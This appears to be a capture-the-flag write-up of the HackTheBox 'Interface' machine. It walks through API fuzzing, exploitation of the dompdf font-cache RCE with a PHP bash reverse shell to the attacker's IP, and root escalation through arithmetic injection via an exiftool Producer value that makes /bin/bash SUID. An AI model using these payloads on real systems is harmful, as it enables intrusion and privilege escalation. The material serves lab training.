---
title: "Interface"
date: 2023-05-13 17:19:38 +0530
categories: [HackTheBox, HTB-Linux]
tags: [Machines,Linux]
image: /assets/img/interface/Interface.png
---

This is [Hackthebox](https://app.hackthebox.com/machines/527) medium Linux machine implemented in  `NextJS` technology with `api`. This box requires much of enumeration with proper payloads and wordlists in order to get proper responses. I will enumerate to get file upload for user and exploit root user through  arithmetic injection.
## Enumeration
### Nmap Scan
```
└─$ nmap -sC -sV -oN nmap-scan  10.10.11.200 
```
**Result**
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 12:03 EAT
Nmap scan report for 10.10.11.200
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
|_  256 cc62905560a658629e6b80105c799b55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.40 second
```
Nmap shows only two ports are open which are `22` for `ssh` and `80` for web service. 

Lets try to access the web page.

### Web Enumeration.
![image](/assets/img/interface/01.png)

Result shows this site is under maintenance. At this step I decided to fuzz for some directories but found nothing.
### Request and Response Headers
It is important to check what headers have been used in testing web application because by doing so it will be easy to know the technology used(Not all the time) and you can find interesting details.

![image](/assets/img/interface/02.png)

In response header `Content-Securiy-Policy` has some urls and one of them is `http://prd.m.rendering-api.interface.htb` then i will add this to `/etc/hosts`<br>
Then after adding now it will resolve easily 

![image](/assets/img/interface/03.png)

The site returns that message meaning the file I was trying to access is not found but I can enumerate more by fuzzing both subdomains and some directories
### Enumerate Enumerate Enumerate 
**Command**
```
└─$ ffuf -u http://prd.m.rendering-api.interface.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 0   
```
**Result**
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://prd.m.rendering-api.interface.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

api                     [Status: 404, Size: 50, Words: 3, Lines: 1]
vendor                  [Status: 403, Size: 15, Words: 2, Lines: 2]
                        [Status: 404, Size: 16, Words: 3, Lines: 2]

```
There is `api` and `vendor` directory then i can try to access them.
```
└─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 10:07:29 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

File not found.
```
The same message continues, meaning more fuzzing is needed here but I can enumerate more in `vendor`, Then lets continue to enumerate this directory.

**Command**
```
└─$ ffuf -u http://prd.m.rendering-api.interface.htb/vendor/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 0
```
**Result**
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://prd.m.rendering-api.interface.htb/vendor/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

                        [Status: 404, Size: 16, Words: 3, Lines: 2]
dompdf                  [Status: 403, Size: 15, Words: 2, Lines: 2]
composer                [Status: 403, Size: 15, Words: 2, Lines: 2]
:: Progress: [30000/30000] :: Job [1/1] :: 410 req/sec :: Duration: [0:01:13] :: Errors: 2 ::
```
The fuzzing provided two new directories which are `composer` and `dompdf` all these directories i can try to access them to see how they will respond as follows:-
```
└─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/composer
HTTP/1.1 403 Forbidden
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 10:37:29 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

Access denied.
```
Composer returns status code `403` with `Access denied` message
```
└─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf  
HTTP/1.1 403 Forbidden
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 10:39:59 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

Access denied.
```
Also `dompdf` does the same  but after some searching i found that [Dompdf](https://www.codexworld.com/convert-html-to-pdf-php-dompdf/) is a PHP library that provides a simple way to convert HTML to PDF documents. Since it is open source then it can be vulnerable at some points.

Searching with `searchsploit` resulted the followings.

**Command**
```
└─$ searchsploit dompdf 
```
**Result**
```
----------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                |  Path
----------------------------------------------------------------------------------------------------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                          | php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion                                                    | php/webapps/14851.txt
TYPO3 Extension ke DomPDF - Remote Code Execution                                             | php/webapps/35443.txt
----------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```
All of these have no place or means to exploit to this web application, I will stop here and go back to `api` and testing it but if there is no interesting details then i will return  to `vendor` with `dom2pdf`.

**Request**
```
└─$ curl -i http://prd.m.rendering-api.interface.htb/api           
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 19:08:40 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive

{"status":"404","status_text":"route not defined"}
```
The response is pretty clear with status code `404` with a message that `route not defined` this  means that the fuzzer was unable to find any endpoints or routes in the target API that it could use to send request then more enumeration is required until to find the valid endpoint.

**Command**
```
└─$ ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 50 -X POST
```
**Result**
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://prd.m.rendering-api.interface.htb/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 50
________________________________________________

html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1]
:: Progress: [30000/30000] :: Job [1/1] :: 491 req/sec :: Duration: [0:01:01] :: Errors: 2 ::
```
Tried to fuzz `api` with `GET` method but it end up with `502` code but after changing it to `POST` result was promising as shown above that there is another endpoint `html2pdf` which i can now access it
```
└─$ curl -i http://prd.m.rendering-api.interface.htb/api/html2pdf
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 19:45:17 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive

{"status":"404","status_text":"route not defined"} 
```
I used the `curl` command without specifying the requesting method which by default will be `GET` and it keep saying `route not defined` . So now i will change the method to `POST` and see the result if it is different.
```
└─$ curl -i http://prd.m.rendering-api.interface.htb/api/html2pdf -X POST
HTTP/1.1 422 Unprocessable Entity
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 19:45:24 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive

{"status_text":"missing parameters"} 
```
Result now is different and claims that some parameters are missed then now another enumeration is required to know which parameters are missed.
### More Enumeration
```
└─$ ffuf -u http://prd.m.rendering-api.interface.htb/api/html2pdf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 50,36  -d '{"FUZZ":"FUZZ"}' -H "Content-Type: application/json"
```
**Result**
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://prd.m.rendering-api.interface.htb/api/html2pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"FUZZ":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 50,36
________________________________________________

html                    [Status: 200, Size: 1130, Words: 116, Lines: 77]
:: Progress: [30000/30000] :: Job [1/1] :: 500 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```
The result is `html` then i can test to request with added `html` parameter. 

![image](/assets/img/interface/04.png)
## Shell as www-data
After much enumeration and fuzzing I found required parameters as shown above and to exploit this web application there is [CVE-2022-28368](https://www.mend.io/vulnerability-database/CVE-2022-28368) but the original post is from [positive.security](https://positive.security/blog/dompdf-rce) to understand more with simple words check also [snyk]( https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/) blog post.

In summary this exploit is done by application allows `php` execution during `pdf` rendering, also with this functionality is that it will format the `pdf` output using straight `html` tags. In exploitation i used this [POC](https://github.com/positive-security/dompdf-rce) from  [positive.security](https://positive.security/blog/dompdf-rce) and below are some few steps to exploit it.

**Step 01**

Change `exploit.css` and add your `ip` as it i placed mine
```
@font-face {
    font-family:'exploitfont';
    src:url('http://10.10.14.94/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
```
**Step 02**

Change the `exploit_font.php` and the following line at the very bottom of the file and do not forget to replace the `ip` and `port`.
```
<?php exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.94/1234 0>&1'"); ?>
```
**Step 03**

Start `python` server to make sure that the file is being sent to the server and delivered successfully. 
```
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
**Step 04**

Send the file with as parameter.

![image](/assets/img/interface/05.png)

**Step 05**

Check for the response 
```
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.200 - - [31/Mar/2023 00:00:39] "GET /exploit.css HTTP/1.0" 200 -
10.10.11.200 - - [31/Mar/2023 00:00:39] "GET /exploit_font.php HTTP/1.0" 200 -
```
**Step 06**

According [positive.security](https://positive.security/blog/dompdf-rce) blog post says wen an external font is used, `dompdf` caches it locally in the `/lib/fonts` sub-directory and adds a corresponding entry in `dompdf_font_family_cache.php`. Also the in the blog post there is a code snippet which shows that the file will be stored with its name but is `md5` hash will be appended at the end of the file name before its extension example if the file is `hashghost_font.php` then it will be stored as `hashghostfont_normal_md5hash.php`

**Step 07**

Create `md5` hash of the file `exploit_font.php`
```
└─$ echo -n http://10.10.14.94/exploit_font.php | md5sum
1a3cd1e49f9b715e8e533407fa8b1caa  -
```

**Step 08**

Start a listener
```
└─$ nc -nlvp 1234
```

**Step 09**

Send the request now 

![image](/assets/img/interface/07.png)

**Step 10**

Response in `netcat` listener 
```
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.94] from (UNKNOWN) [10.10.11.200] 33382
bash: cannot set terminal process group (1159): Inappropriate ioctl for device
bash: no job control in this shell
www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$ 
```
## User 
With user `www-data` i was able to read flag of user `dev` 
```
www-data@interface:/home/dev$ cat user.txt 
415feaa963*******************
```
## Root 
I uploaded [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64) and found that there is a clean up script running by user `root`
``` 
2023/03/30 22:26:01 CMD: UID=0     PID=2784   | /bin/bash /usr/local/sbin/cleancache.sh 
2023/03/30 22:26:01 CMD: UID=0     PID=2783   | /bin/sh -c /usr/local/sbin/cleancache.sh 
2023/03/30 22:26:01 CMD: UID=0     PID=2782   | /usr/sbin/CRON -f 
```
Reading this file
```
www-data@interface:/dev/shm$ cat /usr/local/sbin/cleancache.sh 
```
**Result**
```
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```
This script iterates over files in the `/tmp` directory and checks if they are files (`-f` option). If a file is found, it uses the `exiftool` command to extract the metadata producer information from the file. If the producer is `dompdf`, the script deletes the file using the `rm` command.

This line is vulnerable to [arithmetic injection](https://research.nccgroup.com/2020/05/12/shell-arithmetic-expansion-and-evaluation-abuse/)
```
meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)   
```
I will use as reference 
```
`# VARIABLE='arr[$(uname -n -s -m -o)]' ./arithmetic.sh  
arr[$(uname -n -s -m -o)]
```
Instead of running command as above  i will create a file which executes a `suid` binary of `bash` and name it as `hash.sh`
```
www-data@interface:~$ cat > hash.sh <<EOF                                                                                                                            
#!/bin/bash

chmod u+s /bin/bash
EOF
www-data@interface:~$
```
Now i will create a file in `/tmp` directory because the cleaning script cleans files that are in `/tmp` also i will add  metadata by using `exiftool` 
```
www-data@interface:~$ exiftool -Producer='a[$(hash.sh>&2)]+42'
www-data@interface:~$ touch /tmp/lol
www-data@interface:~$ exiftool -Producer='a[$(hash.sh>&2)]+42' /tmp/lol
    1 image files updated
www-data@interface:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
www-data@interface:~$ bash -p

bash-4.4# cat /root/root.txt
f64108af50*****************
```
The End.
```
Mungu Nisaidie
```